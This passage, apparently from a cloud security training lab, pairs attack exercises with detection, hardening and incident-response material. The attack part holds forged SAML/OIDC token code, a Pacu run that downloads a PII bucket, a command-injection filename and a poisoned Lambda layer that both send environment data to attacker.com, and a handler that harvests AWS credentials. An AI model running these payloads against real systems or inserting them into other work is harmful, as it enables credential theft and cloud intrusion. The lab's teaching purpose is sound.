                    "Effect": "Allow",
                    "Principal": {
                        "Federated": "arn:aws:iam::123456789012:oidc-provider/"
                                    "token.actions.githubusercontent.com"
                    },
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringEquals": {
                            "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
                        }
                        # MISSING: no restriction on sub claim!
                    }
                }]
            },
            "impact": "Any GitHub Actions workflow from any repository can assume this role",
            "exploitation": {
                "attacker_repo": "attacker/malicious-repo",
                "github_action": (
                    "- uses: aws-actions/configure-aws-credentials@v4\n"
                    "  with:\n"
                    "    role-to-assume: arn:aws:iam::123456789012:role/VictimDeployRole\n"
                    "    aws-region: us-east-1"
                ),
                "note": "Attacker's workflow runs in their own repo but assumes victim's role"
            },
            "secure_trust_policy": {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": {
                        "Federated": "arn:aws:iam::123456789012:oidc-provider/"
                                    "token.actions.githubusercontent.com"
                    },
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringEquals": {
                            "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
                            "token.actions.githubusercontent.com:sub":
                                "repo:company/repo:ref:refs/heads/main"
                        }
                    }
                }]
            },
            "fix": "Always restrict both aud and sub claims in OIDC trust policies"
        }

    def forge_oidc_token(self, subject: str, audience: str, issuer: str) -> str:
        """
        Forge an OIDC token (JWT) signed with attacker's key.
        Only works if the cloud provider trusts the attacker's OIDC provider.
        """
        now = int(time.time())
        payload = {
            "iss": issuer,
            "sub": subject,
            "aud": audience,
            "exp": now + 3600,
            "iat": now,
            "nbf": now,
        }
        private_pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        token = jwt.encode(payload, private_pem, algorithm="RS256")
        return token


if __name__ == "__main__":
    import sys
    mode = sys.argv[1] if len(sys.argv) > 1 else "golden-saml"

    if mode == "golden-saml":
        sim = GoldenSAMLSimulator()
        result = sim.forge_saml_assertion(
            target_user="admin@corp.local",
            target_role_arn="arn:aws:iam::123456789012:role/FederatedAdmin",
            provider_arn="arn:aws:iam::123456789012:saml-provider/CompanyIdP"
        )
        print(json.dumps(result, indent=2, default=str))

    elif mode == "oidc":
        exploiter = OIDCTrustExploiter()
        result = exploiter.demonstrate_misconfigured_trust()
        print(json.dumps(result, indent=2))
```

**Verification:** The script demonstrates SAML assertion structure and forging concepts, OIDC trust policy misconfiguration, and detection methods. References SolarWinds SUNBURST as the canonical real-world example.

---

### Exercise 10: Multi-Cloud Assessment with Pacu, Prowler, ScoutSuite, and CloudFox

**Objective:** Use industry-standard cloud security assessment tools to enumerate attack paths across AWS, GCP, and Azure.

**Step 1 — Pacu (AWS exploitation framework):**

```bash
# Initialize Pacu with lab credentials
pacu

# Inside Pacu:
> set_keys
# Enter attacker credentials

> run iam__enum_permissions
# Enumerates all permissions for the current principal

> run iam__privesc_scan
# Scans for IAM privilege escalation paths

> run iam__enum_users_roles_policies_groups
# Full IAM enumeration

> run s3__download_bucket --bucket company-customer-pii
# Download bucket contents

> run lambda__enum
# Enumerate Lambda functions

> run ebs__enum_snapshots
# Find EBS snapshots

> run cloudtrail__csv_inject
# Test CloudTrail CSV injection

> data IAM
# View collected IAM data

> exit
```

**Step 2 — Prowler (CIS benchmark assessment):**

```bash
# Run Prowler against LocalStack (or real AWS account)
prowler aws --endpoint-url http://localhost:4566 \
  -M json-ocsf \
  -o ./prowler-results/ \
  --compliance cis_2.0_aws

# Check specific high-value controls
prowler aws --endpoint-url http://localhost:4566 \
  --checks \
    iam_root_hardware_mfa_enabled \
    iam_no_root_access_key \
    s3_bucket_no_public_access \
    cloudtrail_multi_region_enabled \
    ec2_imdsv2_enabled \
    iam_policy_no_full_admin

# For Azure
prowler azure --sp-env-auth --compliance cis_2.1_azure

# For GCP
prowler gcp --project-ids <project-id> --compliance cis_2.0_gcp
```

**Step 3 — ScoutSuite (multi-cloud audit):**

```bash
# AWS audit
scout aws --profile lab-profile --report-dir ./scoutsuite-aws/

# Azure audit
scout azure --cli --report-dir ./scoutsuite-azure/

# GCP audit
scout gcp --project-id <project-id> --report-dir ./scoutsuite-gcp/

# Review the HTML report in a browser
```

**Step 4 — CloudFox (attack path enumeration):**

```bash
# Run all checks against AWS
cloudfox aws --profile lab-profile all-checks

# Specific attack-path checks
cloudfox aws --profile lab-profile iam-simulator
cloudfox aws --profile lab-profile instances
cloudfox aws --profile lab-profile endpoints
cloudfox aws --profile lab-profile env-vars
cloudfox aws --profile lab-profile secrets
cloudfox aws --profile lab-profile resource-trusts
```

**Step 5 — IaC security scanning with Checkov:**

```bash
# Scan Terraform configurations
checkov -d ./terraform/ --framework terraform --output cli --compact

# Scan specific check IDs
checkov -d ./terraform/ --check CKV_AWS_18,CKV_AWS_19,CKV_AWS_21,CKV_AWS_145

# Scan with Trivy
trivy config ./terraform/ --severity HIGH,CRITICAL

# Pre-commit integration
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/bridgecrewio/checkov
    rev: 3.2.0
    hooks:
      - id: checkov
        args: ['--directory', '.']
  - repo: https://github.com/aquasecurity/trivy
    rev: v0.50.0
    hooks:
      - id: trivy-config
        args: ['--severity', 'HIGH,CRITICAL']
EOF
```

**Verification:** Each tool produces findings that map to specific misconfigurations in the lab environment: wildcard trust policies, public S3 buckets, overprivileged roles, disabled CloudTrail data events.

---

### Exercise 11: Serverless Function Exploitation Across Providers

**Objective:** Exploit serverless function attack surfaces: event injection, dependency confusion, execution role abuse, and `/tmp` persistence.

```python
#!/usr/bin/env python3
"""
scripts/serverless_attacks.py
Cross-provider serverless attack simulations.
"""
import json
import os
import boto3
import zipfile
import tempfile


class LambdaAttackSuite:
    def __init__(self, endpoint_url=None):
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.lam = boto3.client("lambda", **kwargs)
        self.iam = boto3.client("iam", **kwargs)

    def event_injection_payload(self) -> dict:
        """
        Craft a malicious S3 event notification that exploits
        command injection in a vulnerable Lambda handler.
        """
        return {
            "Records": [{
                "eventVersion": "2.1",
                "eventSource": "aws:s3",
                "awsRegion": "us-east-1",
                "eventName": "ObjectCreated:Put",
                "s3": {
                    "bucket": {"name": "company-uploads"},
                    "object": {
                        # Command injection via filename
                        "key": "uploads/$(curl${IFS}http://attacker.com/exfil?data=$(env|base64)).txt",
                        "size": 1024
                    }
                }
            }]
        }

    def tmp_persistence_payload(self) -> str:
        """
        Lambda /tmp persistence: write a payload that survives
        warm invocations and modifies subsequent execution.
        """
        return '''
import os
import json

PERSISTENCE_FILE = "/tmp/.hidden_payload"

def handler(event, context):
    # Check if persistence payload exists from previous invocation
    if os.path.exists(PERSISTENCE_FILE):
        with open(PERSISTENCE_FILE) as f:
            stolen_data = json.load(f)
        # Exfiltrate previously captured data
        return {"persisted_data": stolen_data}

    # First invocation: capture environment and persist
    env_data = {
        "aws_access_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
        "aws_secret_key": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "aws_session_token": os.environ.get("AWS_SESSION_TOKEN", ""),
        "aws_region": os.environ.get("AWS_DEFAULT_REGION", ""),
        "function_name": os.environ.get("AWS_LAMBDA_FUNCTION_NAME", ""),
        "handler": os.environ.get("_HANDLER", ""),
    }
    with open(PERSISTENCE_FILE, "w") as f:
        json.dump(env_data, f)

    return {"status": "payload installed", "next_invocation": "will exfiltrate"}
'''

    def layer_poisoning_attack(self) -> dict:
        """Demonstrate Lambda Layer poisoning attack."""
        return {
            "attack": "Lambda Layer Poisoning",
            "description": "Publish malicious layer version that auto-loads on cold start",
            "commands": [
                "# Create malicious layer with modified runtime bootstrap",
                "mkdir -p /tmp/layer/python",
                "echo 'import os; os.system(\"curl attacker.com/exfil?data=$(env|base64)\")' "
                "> /tmp/layer/python/sitecustomize.py",
                "cd /tmp/layer && zip -r layer.zip python/",
                "",
                "# Publish as new version of existing layer",
                "aws lambda publish-layer-version \\",
                "  --layer-name shared-utils \\",
                "  --zip-file fileb:///tmp/layer/layer.zip \\",
                "  --compatible-runtimes python3.12",
                "",
                "# All functions using 'shared-utils:latest' will load attacker code",
            ],
            "prevention": [
                "Pin layer versions explicitly in function configuration",
                "Restrict lambda:PublishLayerVersion to trusted CI/CD roles only",
                "Monitor CloudTrail for PublishLayerVersion events"
            ]
        }

    def env_var_injection(self) -> dict:
        """LD_PRELOAD / PATH injection via UpdateFunctionConfiguration."""
        return {
            "attack": "Environment Variable Injection",
            "commands": [
                "# Upload malicious shared library to /tmp via initial exploitation",
                "# Then modify function environment to load it",
                "aws lambda update-function-configuration \\",
                "  --function-name target-function \\",
                "  --environment '{\"Variables\":{\"LD_PRELOAD\":\"/tmp/malicious.so\"}}'",
                "",
                "# Alternative: PATH hijack",
                "aws lambda update-function-configuration \\",
                "  --function-name target-function \\",
                "  --environment '{\"Variables\":{\"PATH\":\"/tmp:/usr/local/bin:/usr/bin\"}}'",
            ],
            "detection_cloudtrail": (
                "SELECT eventTime, userIdentity.arn, requestParameters.functionName "
                "FROM <EVENT_DATA_STORE_ID> "
                "WHERE eventName = 'UpdateFunctionConfiguration20150331v2'"
            )
        }


if __name__ == "__main__":
    suite = LambdaAttackSuite(endpoint_url="http://localhost:4566")
    print("=== Event Injection Payload ===")
    print(json.dumps(suite.event_injection_payload(), indent=2))
    print("\n=== /tmp Persistence Payload ===")
    print(suite.tmp_persistence_payload())
    print("\n=== Layer Poisoning ===")
    print(json.dumps(suite.layer_poisoning_attack(), indent=2))
    print("\n=== Environment Variable Injection ===")
    print(json.dumps(suite.env_var_injection(), indent=2))
```

**Verification:** The script demonstrates four serverless attack vectors. The `/tmp` persistence payload shows how a compromised Lambda invocation can persist across warm starts. Layer poisoning and env-var injection show persistent code execution paths.

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 12: Cloud Detection Engineering — Sigma Rules and Native Alerting

**Objective:** Deploy cloud-specific Sigma detection rules, configure CloudWatch/EventBridge alerts, and set up Azure Monitor / GCP Cloud Monitoring alert policies.

**Step 1 — Deploy Sigma rules for cloud events:**

```yaml
# detection/sigma-rules/aws_iam_access_key_unusual_ip.yml
title: AWS IAM Access Key Created From Unusual IP
id: 7a3e2c91-d4f8-4b1a-9c6e-3f5a8b2d1e04
status: experimental
description: >
  Detects creation of IAM access keys from IP addresses not belonging
  to known corporate or VPN CIDR ranges.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: CreateAccessKey
    eventSource: iam.amazonaws.com
  filter_known_ips:
    sourceIPAddress|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  condition: selection and not filter_known_ips
falsepositives:
  - Administrators working from personal networks
  - CI/CD pipelines with dynamic IPs
level: high
tags:
  - attack.persistence
  - attack.t1098.001
```

```yaml
# detection/sigma-rules/aws_s3_public_policy.yml
title: AWS S3 Bucket Policy Changed To Allow Public Access
id: 8b4f1d72-e5a9-4c2b-ad3f-6e7c9a1b5d83
status: experimental
description: >
  Detects PutBucketPolicy events where the new policy contains
  a wildcard principal, indicating public access.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection_policy:
    eventName: PutBucketPolicy
    eventSource: s3.amazonaws.com
    requestParameters|contains: '"Principal":"*"'
  selection_delete_block:
    eventName: DeletePublicAccessBlock
    eventSource: s3.amazonaws.com
  condition: selection_policy or selection_delete_block
falsepositives:
  - Intentional public bucket for static website hosting
level: critical
tags:
  - attack.exfiltration
  - attack.t1537
```

```yaml
# detection/sigma-rules/aws_cloudtrail_disabled.yml
title: AWS CloudTrail Logging Disabled
id: c3f95da6-e8a4-4b2c-ad7f-4a6b3c9e8f21
status: experimental
description: >
  Detects events that disable or degrade audit logging.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName:
      - StopLogging
      - DeleteTrail
      - UpdateTrail
    eventSource: cloudtrail.amazonaws.com
  condition: selection
falsepositives:
  - Trail consolidation during account restructuring
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562.008
```

```yaml
# detection/sigma-rules/aws_assume_role_external.yml
title: AWS AssumeRole From Unknown External Account
id: b2e84c95-d7f3-4a1b-9c6e-3f5a2b8d7e19
status: experimental
description: >
  Detects sts:AssumeRole from accounts not in the trusted list.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: AssumeRole
    eventSource: sts.amazonaws.com
  filter_internal:
    userIdentity.accountId:
      - '111111111111'
      - '222222222222'
  filter_aws_services:
    userIdentity.invokedBy|contains: '.amazonaws.com'
  condition: selection and not filter_internal and not filter_aws_services
falsepositives:
  - Newly onboarded partner accounts
level: high
tags:
  - attack.lateral_movement
  - attack.t1550.001
```

```yaml
# detection/sigma-rules/azure_ca_policy_modified.yml
title: Azure AD Conditional Access Policy Modified Or Deleted
id: 9c5e2a63-f7b1-4d8c-be4a-7f8d0c3e6a15
status: experimental
description: >
  Detects modifications or deletions of Conditional Access policies.
logsource:
  product: azure
  service: auditlogs
detection:
  selection:
    operationName:
      - 'Update conditional access policy'
      - 'Delete conditional access policy'
    category: Policy
  condition: selection
falsepositives:
  - Legitimate policy updates by identity administrators
level: high
tags:
  - attack.defense_evasion
  - attack.t1562.001
```

```yaml
# detection/sigma-rules/gcp_sa_key_created.yml
title: GCP Service Account Key Created
id: a1d73b84-c6e2-4f9a-8b5d-2e4f1a7c9d06
status: experimental
description: >
  Detects creation of GCP service account keys.
logsource:
  product: gcp
  service: gcp.audit
detection:
  selection:
    methodName: google.iam.admin.v1.CreateServiceAccountKey
  condition: selection
falsepositives:
  - Legacy apps requiring key-based auth
level: high
tags:
  - attack.persistence
  - attack.t1098.001
```

```yaml
# detection/sigma-rules/aws_unusual_region.yml
title: AWS API Call From Unusual Region
id: d4a06eb7-f9b5-4c3d-be8a-5b7c4d0f9a32
status: experimental
description: >
  Detects API calls from regions not in the approved list.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventType: AwsApiCall
  filter_approved_regions:
    awsRegion:
      - us-east-1
      - us-west-2
      - eu-west-1
  filter_global:
    awsRegion: us-east-1
    eventSource:
      - iam.amazonaws.com
      - sts.amazonaws.com
      - organizations.amazonaws.com
  condition: selection and not filter_approved_regions and not filter_global
falsepositives:
  - DR testing in alternate regions
level: medium
tags:
  - attack.defense_evasion
  - attack.t1535
```

**Step 2 — Configure AWS CloudWatch alarms and EventBridge rules:**

```bash
#!/bin/bash
# detection/setup-aws-alerts.sh
# Deploy CloudWatch + EventBridge detection rules

ENDPOINT="http://localhost:4566"

echo "[*] Creating CloudWatch metric filters..."

# IAM access key creation
aws logs create-log-group --log-group-name CloudTrail/ManagementEvents \
  --endpoint-url "$ENDPOINT" 2>/dev/null || true

aws logs put-metric-filter \
  --log-group-name CloudTrail/ManagementEvents \
  --filter-name IAMAccessKeyCreated \
  --filter-pattern '{ ($.eventName = "CreateAccessKey") }' \
  --metric-transformations \
    metricName=IAMAccessKeyCreationCount,metricNamespace=CloudSecurity,metricValue=1 \
  --endpoint-url "$ENDPOINT"

# CloudTrail tampering
aws logs put-metric-filter \
  --log-group-name CloudTrail/ManagementEvents \
  --filter-name CloudTrailTampering \
  --filter-pattern '{ ($.eventName = "StopLogging") || ($.eventName = "DeleteTrail") || ($.eventName = "UpdateTrail") }' \
  --metric-transformations \
    metricName=CloudTrailTamperingCount,metricNamespace=CloudSecurity,metricValue=1 \
  --endpoint-url "$ENDPOINT"

# IAM policy changes
aws logs put-metric-filter \
  --log-group-name CloudTrail/ManagementEvents \
  --filter-name IAMPolicyChanges \
  --filter-pattern '{ ($.eventName = "CreatePolicyVersion") || ($.eventName = "AttachUserPolicy") || ($.eventName = "AttachRolePolicy") || ($.eventName = "PutUserPolicy") || ($.eventName = "PutRolePolicy") }' \
  --metric-transformations \
    metricName=IAMPolicyChangeCount,metricNamespace=CloudSecurity,metricValue=1 \
  --endpoint-url "$ENDPOINT"

echo "[*] Creating CloudWatch alarms..."

aws sns create-topic --name SecurityAlerts --endpoint-url "$ENDPOINT"
TOPIC_ARN=$(aws sns list-topics --endpoint-url "$ENDPOINT" --query 'Topics[0].TopicArn' --output text)

for metric in IAMAccessKeyCreationCount CloudTrailTamperingCount IAMPolicyChangeCount; do
  aws cloudwatch put-metric-alarm \
    --alarm-name "${metric}Alarm" \
    --metric-name "$metric" \
    --namespace CloudSecurity \
    --statistic Sum \
    --period 300 \
    --threshold 1 \
    --comparison-operator GreaterThanOrEqualToThreshold \
    --evaluation-periods 1 \
    --alarm-actions "$TOPIC_ARN" \
    --endpoint-url "$ENDPOINT"
done

echo "[*] Creating EventBridge rules..."

# CloudTrail disable detection
aws events put-rule \
  --name DetectCloudTrailDisable \
  --event-pattern '{
    "source": ["aws.cloudtrail"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["StopLogging", "DeleteTrail"]
    }
  }' \
  --endpoint-url "$ENDPOINT"

aws events put-targets \
  --rule DetectCloudTrailDisable \
  --targets "Id=1,Arn=$TOPIC_ARN" \
  --endpoint-url "$ENDPOINT"

# S3 public access changes
aws events put-rule \
  --name DetectS3PublicAccess \
  --event-pattern '{
    "source": ["aws.s3"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["PutBucketPolicy", "DeletePublicAccessBlock", "PutBucketAcl"]
    }
  }' \
  --endpoint-url "$ENDPOINT"

aws events put-targets \
  --rule DetectS3PublicAccess \
  --targets "Id=1,Arn=$TOPIC_ARN" \
  --endpoint-url "$ENDPOINT"

echo "[*] AWS alerting configuration complete."
```

**Step 3 — Azure Monitor and GCP alerting configurations (reference):**

```bash
#!/bin/bash
# detection/setup-azure-alerts.sh
# Deploy Azure Monitor alert rules (requires real Azure subscription)

# Conditional Access policy changes
az monitor scheduled-query create \
  --name "ConditionalAccessPolicyChange" \
  --resource-group SecurityRG \
  --scopes "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SecurityWorkspace" \
  --condition "count 'AuditLogs | where OperationName has \"conditional access policy\" | where Result == \"success\"' > 0" \
  --window-size 5m \
  --evaluation-frequency 5m \
  --severity 2 \
  --action-groups "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.Insights/actionGroups/SecurityTeam"

# Service principal credential additions
az monitor scheduled-query create \
  --name "ServicePrincipalCredentialAdded" \
  --resource-group SecurityRG \
  --scopes "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SecurityWorkspace" \
  --condition "count 'AuditLogs | where OperationName == \"Add service principal credentials\"' > 0" \
  --window-size 5m \
  --evaluation-frequency 5m \
  --severity 1

# Legacy auth detection
az monitor scheduled-query create \
  --name "LegacyAuthSuccess" \
  --resource-group SecurityRG \
  --scopes "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SecurityWorkspace" \
  --condition "count 'SigninLogs | where ClientAppUsed in (\"Exchange ActiveSync\",\"IMAP4\",\"POP3\",\"SMTP\") | where ResultType == \"0\"' > 0" \
  --window-size 10m \
  --evaluation-frequency 5m \
  --severity 2
```

```bash
#!/bin/bash
# detection/setup-gcp-alerts.sh
# Deploy GCP Cloud Monitoring alerts (requires real GCP project)

# Service account key creation
gcloud logging metrics create sa-key-creation \
  --description="Detects service account key creation" \
  --log-filter='protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"'

# IAM policy changes
gcloud logging metrics create iam-policy-change \
  --description="Detects IAM policy modifications" \
  --log-filter='protoPayload.methodName="SetIamPolicy"'

# Log sink deletion
gcloud logging metrics create log-sink-deleted \
  --description="Detects log sink deletion" \
  --log-filter='protoPayload.methodName="google.logging.v2.ConfigServiceV2.DeleteSink"'
```

**Verification:** CloudWatch alarms fire when IAM keys are created, CloudTrail is tampered with, or S3 policies are modified. Sigma rules compile to CloudTrail Lake SQL, Azure KQL, and GCP log filters.

---

### Exercise 13: Cloud Hardening — SCPs, Conditional Access, Organization Policies

**Objective:** Deploy preventive controls across all three cloud providers: AWS SCPs, Azure Conditional Access + PIM, and GCP Organization Policies.

**Step 1 — AWS Service Control Policies:**

```json
// hardening/aws-scp-comprehensive.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    },
    {
      "Sid": "DenyUnusedRegions",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": ["us-east-1", "us-west-2", "eu-west-1"]
        },
        "ArnNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/OrganizationAccountAccessRole"
        }
      }
    },
    {
      "Sid": "DenyCloudTrailTampering",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail"
      ],
      "Resource": "*"
    },
    {
      "Sid": "DenyIAMEscalation",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion",
        "iam:AttachUserPolicy",
        "iam:AttachRolePolicy",
        "iam:PutUserPolicy",
        "iam:PutRolePolicy",
        "iam:CreateLoginProfile",
        "iam:UpdateLoginProfile"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/ApprovedAdminRole"
        }
      }
    },
    {
      "Sid": "DenyS3PublicAccessRemoval",
      "Effect": "Deny",
      "Action": [
        "s3:PutBucketPublicAccessBlock",
        "s3:DeletePublicAccessBlock",
        "s3:PutBucketPolicy"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/ApprovedAdminRole"
        }
      }
    },
    {
      "Sid": "DenyLeaveOrg",
      "Effect": "Deny",
      "Action": "organizations:LeaveOrganization",
      "Resource": "*"
    }
  ]
}
```

**Step 2 — AWS hardening deployment script:**

```bash
#!/bin/bash
# hardening/deploy-aws-hardening.sh

ENDPOINT="http://localhost:4566"

echo "[*] Enforcing IMDSv2 on existing instances..."
for instance_id in $(aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].InstanceId' \
  --output text --endpoint-url "$ENDPOINT" 2>/dev/null); do
  aws ec2 modify-instance-metadata-options \
    --instance-id "$instance_id" \
    --http-tokens required \
    --http-put-response-hop-limit 1 \
    --http-endpoint enabled \
    --endpoint-url "$ENDPOINT"
done

echo "[*] Enforcing S3 Block Public Access at account level..."
aws s3control put-public-access-block \
  --account-id 000000000000 \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true \
  --endpoint-url "$ENDPOINT" 2>/dev/null || true

echo "[*] Creating immutable CloudTrail log bucket..."
aws s3 mb s3://org-cloudtrail-immutable --endpoint-url "$ENDPOINT" 2>/dev/null || true
aws s3api put-object-lock-configuration --bucket org-cloudtrail-immutable \
  --object-lock-configuration '{
    "ObjectLockEnabled": "Enabled",
    "Rule": {
      "DefaultRetention": {
        "Mode": "COMPLIANCE",
        "Days": 365
      }
    }
  }' --endpoint-url "$ENDPOINT" 2>/dev/null || true

echo "[*] Creating VPC endpoint policy to restrict S3 exfiltration..."
# This restricts which S3 buckets can be accessed from within the VPC
cat > /tmp/vpc-endpoint-policy.json << 'POLICY'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "AllowOnlyCompanyBuckets",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:PutObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::company-*",
      "arn:aws:s3:::company-*/*",
      "arn:aws:s3:::org-cloudtrail-*",
      "arn:aws:s3:::org-cloudtrail-*/*"
    ]
  }]
}
POLICY

echo "[*] AWS hardening deployment complete."
```

**Step 3 — GCP Organization Policy constraints:**

```bash
#!/bin/bash
# hardening/deploy-gcp-hardening.sh
# Apply GCP organization policy constraints

ORG_ID="<org-id>"

echo "[*] Disabling service account key creation..."
gcloud resource-manager org-policies set-policy \
  --organization="$ORG_ID" /dev/stdin <<'EOF'
constraint: iam.disableServiceAccountKeyCreation
booleanPolicy:
  enforced: true
EOF

echo "[*] Enforcing uniform bucket-level access..."
gcloud resource-manager org-policies enable-enforce \
  storage.uniformBucketLevelAccess \
  --organization="$ORG_ID"

echo "[*] Restricting VM external IPs..."
gcloud resource-manager org-policies set-policy \
  --organization="$ORG_ID" /dev/stdin <<'EOF'
constraint: compute.vmExternalIpAccess
listPolicy:
  allValues: DENY
EOF

echo "[*] Disabling VM serial port access..."
gcloud resource-manager org-policies set-policy \
  --organization="$ORG_ID" /dev/stdin <<'EOF'
constraint: compute.disableSerialPortAccess
booleanPolicy:
  enforced: true
EOF

echo "[*] Requiring OS Login..."
gcloud resource-manager org-policies set-policy \
  --organization="$ORG_ID" /dev/stdin <<'EOF'
constraint: compute.requireOsLogin
booleanPolicy:
  enforced: true
EOF

echo "[*] Restricting resource locations..."
gcloud resource-manager org-policies set-policy \
  --organization="$ORG_ID" /dev/stdin <<'EOF'
constraint: gcp.resourceLocations
listPolicy:
  allowedValues:
    - in:us-locations
    - in:eu-locations
EOF

echo "[*] Setting up VPC Service Controls..."
gcloud access-context-manager perimeters create production-perimeter \
  --policy="<policy-id>" \
  --title="Production Data Perimeter" \
  --resources="projects/<project-number>" \
  --restricted-services="storage.googleapis.com,bigquery.googleapis.com" \
  --perimeter-type=regular

echo "[*] GCP hardening complete."
```

**Step 4 — Terraform hardening module (IaC):**

```hcl
# hardening/terraform/aws-security-baseline/main.tf

# Enforce IMDSv2 on all instances via launch template
resource "aws_launch_template" "secure_default" {
  name_prefix = "secure-"

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"
    http_put_response_hop_limit = 1
    instance_metadata_tags      = "disabled"
  }
}

# Account-level S3 Block Public Access
resource "aws_s3_account_public_access_block" "block_all" {
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# CloudTrail with immutable logging
resource "aws_cloudtrail" "org_trail" {
  name                          = "org-management-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail_logs.id
  is_multi_region_trail         = true
  is_organization_trail         = true
  enable_log_file_validation    = true
  include_global_service_events = true
  kms_key_id                    = aws_kms_key.cloudtrail.arn

  event_selector {
    read_write_type           = "All"
    include_management_events = true

    data_resource {
      type   = "AWS::S3::Object"
      values = ["arn:aws:s3:::"]
    }

    data_resource {
      type   = "AWS::Lambda::Function"
      values = ["arn:aws:lambda"]
    }
  }
}

resource "aws_s3_bucket" "cloudtrail_logs" {
  bucket = "org-cloudtrail-logs-immutable"
}

resource "aws_s3_bucket_versioning" "cloudtrail_logs" {
  bucket = aws_s3_bucket.cloudtrail_logs.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "cloudtrail_logs" {
  bucket = aws_s3_bucket.cloudtrail_logs.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.cloudtrail.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_kms_key" "cloudtrail" {
  description = "CloudTrail log encryption"
  policy      = data.aws_iam_policy_document.cloudtrail_kms.json
}

data "aws_iam_policy_document" "cloudtrail_kms" {
  statement {
    sid       = "CloudTrailEncrypt"
    actions   = ["kms:GenerateDataKey*"]
    resources = ["*"]
    principals {
      type        = "Service"
      identifiers = ["cloudtrail.amazonaws.com"]
    }
  }
  statement {
    sid       = "AdminAccess"
    actions   = ["kms:*"]
    resources = ["*"]
    principals {
      type        = "AWS"
      identifiers = ["arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"]
    }
  }
}

data "aws_caller_identity" "current" {}
```

**Verification:** SCPs block IAM escalation attempts, S3 public access modifications, and CloudTrail tampering. GCP org policies prevent key creation and external IPs. Terraform modules enforce security baselines at deployment time.

---

### Exercise 14: Cloud Forensics and Incident Response Playbooks

**Objective:** Execute incident response procedures for a simulated credential compromise: evidence preservation, timeline reconstruction, containment, and eradication.

```python
#!/usr/bin/env python3
"""
scripts/cloud_ir_playbook.py
Cloud Incident Response automation: evidence collection,
timeline reconstruction, containment, and eradication.
"""
import boto3
import json
import os
from datetime import datetime, timezone, timedelta
from typing import Optional


class AWSIncidentResponder:
    def __init__(self, endpoint_url: Optional[str] = None):
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.iam = boto3.client("iam", **kwargs)
        self.sts = boto3.client("sts", **kwargs)
        self.s3 = boto3.client("s3", **kwargs)
        self.ct = boto3.client("cloudtrail", **kwargs)
        self.evidence_dir = "/opt/evidence"
        os.makedirs(self.evidence_dir, exist_ok=True)

    def playbook_compromised_credential(self, username: str,
                                         access_key_id: str) -> dict:
        """
        Playbook 1: Compromised IAM Credential Response.
        Sequence: disable → preserve evidence → investigate → contain → eradicate.
        """
        results = {
            "incident_id": f"IR-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}",
            "start_time": datetime.now(timezone.utc).isoformat(),
            "target_user": username,
            "target_key": access_key_id,
            "phases": {}
        }

        # Phase 1: Immediate containment — disable the compromised key
        results["phases"]["1_containment"] = self._disable_access_key(
            username, access_key_id
        )

        # Phase 2: Preserve evidence — enumerate user configuration
        results["phases"]["2_evidence"] = self._collect_user_evidence(username)

        # Phase 3: Investigate — query CloudTrail for attacker actions
